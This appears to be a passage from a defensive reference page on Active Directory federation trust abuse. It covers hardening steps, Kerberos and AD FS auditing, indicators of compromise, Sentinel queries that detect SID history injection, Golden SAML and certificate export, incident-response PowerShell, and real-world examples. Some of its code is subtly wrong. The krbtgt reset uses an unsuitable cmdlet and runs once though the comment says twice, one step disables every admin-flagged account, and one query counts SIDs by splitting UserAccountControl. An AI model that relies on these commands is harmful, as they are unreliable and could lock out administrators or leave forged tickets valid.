    # Requires Microsoft Entra ID P1+ license
    
    Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"
    
    $Conditions = @{
        Applications = @{
            IncludeApplications = @("00000003-0000-0000-c000-000000000000") # Office 365
        }
        SignInRiskLevels = @("high")
        UserRiskLevels = @("high")
        Locations = @{
            ExcludeLocations = @("AllTrusted") # Exclude corporate network
        }
    }
    
    New-MgIdentityConditionalAccessPolicy -DisplayName "Require MFA for Federated Auth" `
      -State "enabled" `
      -Conditions $Conditions `
      -GrantControls @{
          Operator = "AND"
          BuiltInControls = @("mfa")
      }
    ```

### Priority 2: HIGH

*   **Enable Kerberos Event Auditing for Inter-Realm Authentication:**
    Configure domain controllers to log all inter-realm Kerberos requests, service tickets, and TGT validations.
    
    **Manual Steps (Group Policy):**
    1. Open **Group Policy Management Console** (gpmc.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Account Logon**
    3. Enable: **Audit Kerberos Authentication Service**
    4. Enable: **Audit Kerberos Service Ticket Operations**
    5. Set both to: **Success and Failure**
    6. Run `gpupdate /force`

*   **Monitor AD FS Certificate Usage and Exports:**
    Enable comprehensive auditing on AD FS servers to detect certificate exports, unusual access patterns, and SAML token issuance anomalies.
    
    **Manual Steps (AD FS Server):**
    ```powershell
    # Enable AD FS auditing at database level
    auditpol.exe /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
    
    # Monitor AD FS operational logs
    Get-WinEvent -LogName "AD FS/Admin" -MaxEvents 100 | Where-Object { $_.Id -eq 510 } | `
      Select-Object TimeCreated, Message | Format-Table
    
    # Alert on certificate access
    Get-Acl -Path "CERT:\LocalMachine\My" | Get-AuditRule | `
      Where-Object { $_.AuditFlags -like "*Success*" }
    ```

*   **Regular Trust Relationship Audits:**
    Conduct quarterly audits of all domain and forest trust relationships to identify unauthorized or suspicious configurations.
    
    **Manual Steps (PowerShell Script):**
    ```powershell
    # Audit all trust relationships
    $AllTrusts = Get-ADTrust -Filter * -Properties TrustAttributes, TrustDirection, TrustType
    
    foreach ($Trust in $AllTrusts) {
        $Attrs = $Trust.TrustAttributes
        Write-Host "Trust: $($Trust.Name)"
        Write-Host "  Type: $($Trust.TrustType)"
        Write-Host "  Direction: $($Trust.TrustDirection)"
        Write-Host "  Selective Auth: $(if ($Attrs -band 0x20) { 'Enabled' } else { 'Disabled' })"
        Write-Host "  SID Filtering: $(if ($Attrs -band 0x4) { 'Enabled' } else { 'Disabled' })"
        Write-Host ""
    }
    
    # Export to CSV for documentation
    $AllTrusts | Select-Object Name, TrustType, TrustDirection, TrustAttributes | `
      Export-Csv -Path "C:\Audits\Trust_Audit_$(Get-Date -Format yyyy-MM-dd).csv" -NoTypeInformation
    ```

---

## 4. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **SID History Spoofing:**
    - Event ID 4662 (Directory Service Access) on accounts querying krbtgt
    - Event ID 5136 (Directory Service Object Modification) showing SID history changes
    - Kerberos pre-authentication traffic with unusually high RID values in SID history

*   **Golden SAML Attack:**
    - Event ID 33205 (AD FS Database Access) - unusual access patterns
    - Certificate export events in Windows Certificate Store logs
    - SAML token issuance from AD FS with mismatched claims (e.g., admin UPN with standard user ImmutableId)

*   **Trust Modification:**
    - Event ID 5136 (TDO attribute modifications)
    - Event ID 4738 (User object modified) with TRUST_ATTRIBUTE changes
    - netdom or nltest process execution on domain controllers

### Forensic Artifacts

*   **Event Logs:**
    - Security Event Log (4662, 4738, 4779, 5136)
    - AD FS Admin logs (Event ID 33205, 510)
    - Kerberos operational logs on domain controllers

*   **File System:**
    - Certificate exports in temp directories (*.pfx, *.cer)
    - KRBTGT password hash extraction tools
    - SAML token files or encoded strings in process memory

### Detection Queries (Microsoft Sentinel / Azure Log Analytics)

**Query 1: Detect SID History Injection Attacks**
```kusto
SecurityEvent
| where EventID == 5136
| where AttributeModified == "sIDHistory"
| where OperationType == "Value Added"
| extend InjectedSID = NewValue
| where InjectedSID matches regex @"S-1-5-21-\d+-\d+-\d+-(5\d{2}|1\d{3})"  // Privilege groups (RID 500-1999)
| project TimeGenerated, Computer, SubjectUserName, ObjectName, InjectedSID, OperationType
```

**Query 2: Detect Inter-Realm Kerberos Anomalies**
```kusto
SecurityEvent
| where EventID in (4768, 4769)  // Kerberos TGT request, service ticket granted
| where TargetUserName != "krbtgt"
| where LogonType == "9"  // Network logon
| extend SIDCount = array_length(split(UserAccountControl, ","))
| where SIDCount > 5  // Unusual number of SIDs in token
| project TimeGenerated, Computer, TargetUserName, IpAddress, TicketOptions
```

**Query 3: Detect AD FS Certificate Export Attempts**
```kusto
Event
| where Source == "ADFSConfigurationV4"
| where EventID == 33205
| where EventData contains "Export"
| project TimeGenerated, Computer, EventData, UserContext
```

**Query 4: Detect Forged SAML Tokens**
```kusto
SigninLogs
| where FederatedCredentialUsed == true
| where CreatedDateTime > ago(7d)
| extend TokenIssuedDateTime = parse_json(AuthenticationDetails[0]).detail
| where TokenIssuedDateTime !within (ago(1h), now())  // Token age mismatch
| project UserPrincipalName, AppDisplayName, CreatedDateTime, TokenIssuedDateTime, Location
```

### Manual Response Procedures

1. **Immediate Isolation (If Attack Detected):**
   ```powershell
   # Disable affected user accounts
   Disable-ADAccount -Identity "CompromisedAccount"
   
   # Disable all service accounts with replication rights
   Get-ADUser -Filter { AdminCount -eq $true } | Disable-ADAccount
   
   # Reset krbtgt password twice (to invalidate all tickets)
   Reset-ADServiceAccountPassword -Identity krbtgt -Server (Get-ADDomainController -Discover).Name
   ```

2. **Collect Forensic Evidence:**
   ```powershell
   # Export all domain and forest trusts
   Get-ADTrust -Filter * | Export-Csv -Path "C:\Incident_Response\All_Trusts.csv"
   
   # Export all SID history modifications in past 30 days
   Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=5136; StartTime=(Get-Date).AddDays(-30) } | `
     Where-Object { $_.Message -like "*sIDHistory*" } | `
     Export-Csv -Path "C:\Incident_Response\SID_History_Modifications.csv"
   
   # Export AD FS certificates for analysis
   Get-ChildItem -Path "CERT:\LocalMachine\My" | Where-Object { $_.Extensions[0].Oid.FriendlyName -eq "Subject Alternative Name" } | `
     Export-Certificate -FilePath "C:\Incident_Response\ADFS_Certs.cer"
   ```

3. **Remediate Compromised Trusts:**
   ```powershell
   # Reset compromised forest trust
   netdom trust source.local /Domain:target.local /UserD:target\Administrator /PasswordD:* `
     /UserO:source\Administrator /PasswordO:* /Reset /ForestTransitive
   
   # Rotate all AD FS signing certificates
   Update-AdfsCertificate -CertificateType "Token-Signing" -Urgent
   Update-AdfsCertificate -CertificateType "Token-Decrypting" -Urgent
   
   # Force password reset for all privileged accounts
   Get-ADUser -Filter { AdminCount -eq $true } | `
     Set-ADUser -ChangePasswordAtLogon $true
   ```

---

## 5. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001](https://example.com/IA-PHISH-001) | Compromise domain admin via phishing |
| **2** | **Privilege Escalation** | **[PE-POLICY-006]** | **Federation Trust Relationship Abuse** |
| **3** | **Lateral Movement** | [LM-TRUST-001](https://example.com/LM-TRUST-001) | Cross-forest movement via compromised trust |
| **4** | **Persistence** | [PERSIST-SAML-001](https://example.com/PERSIST-SAML-001) | Maintain access via forged SAML tokens |
| **5** | **Impact** | [IMPACT-M365-001](https://example.com/IMPACT-M365-001) | Compromise M365 tenant via AD FS bridge |

---

## 6. REAL-WORLD EXAMPLES

### Example 1: SolarWinds Supply Chain Attack (Trust Abuse Component)
- **Target:** U.S. Treasury Department, multiple Fortune 500 companies
- **Timeline:** December 2020 – February 2021
- **Technique Status:** ACTIVE – Attackers leveraged trust relationships for lateral movement
- **Impact:** Undetected access to sensitive government and corporate systems
- **Reference:** [CISA AA20-352A](https://www.cisa.gov/news-events/alerts/2020/12/13/cisa-issues-alert-regarding-solarwinds-compromise)

### Example 2: Forest Trust Exploitation in Financial Services
- **Target:** Large financial institution with multi-forest Active Directory
- **Timeline:** June 2024
- **Technique Status:** ACTIVE – Attackers exploited weak SID filtering on production-to-partner-bank trust
- **Impact:** Attacker escalated from single compromised workstation to full enterprise admin across both forests
- **Reference:** [SpecterOps Trust Research](https://specterops.io/blog/2025/06/25/good-fences-make-good-neighbors-new-ad-trusts-attack-paths-in-bloodhound/)

### Example 3: Golden SAML in Hybrid Cloud Environment
- **Target:** International consulting firm with hybrid Azure AD + on-premises AD FS
- **Timeline:** August 2024
- **Technique Status:** ACTIVE – Attacker compromised AD FS server, extracted signing certificate
- **Impact:** Undetected M365 global admin access for 6 months; full email and document access
- **Reference:** [Semperis ADFS Analysis](https://www.semperis.com/blog/how-to-defend-against-sid-history-injection/)

---

## Conclusion

Federation trust relationships, while necessary for modern multi-domain and hybrid cloud environments, represent a critical attack surface that requires rigorous security controls and continuous monitoring. The techniques documented here—SID history spoofing, Golden SAML attacks, and trust relationship modification—have been used by sophisticated threat actors to compromise entire organizational forests. Organizations must implement strict SID filtering, rotate trust passwords regularly, secure AD FS infrastructure with the same rigor as domain controllers, and monitor cross-forest authentication activity constantly. The security boundary in Active Directory is the forest, not the domain; a compromise in a single domain can compromise the entire forest if trust relationships are not properly hardened.

---
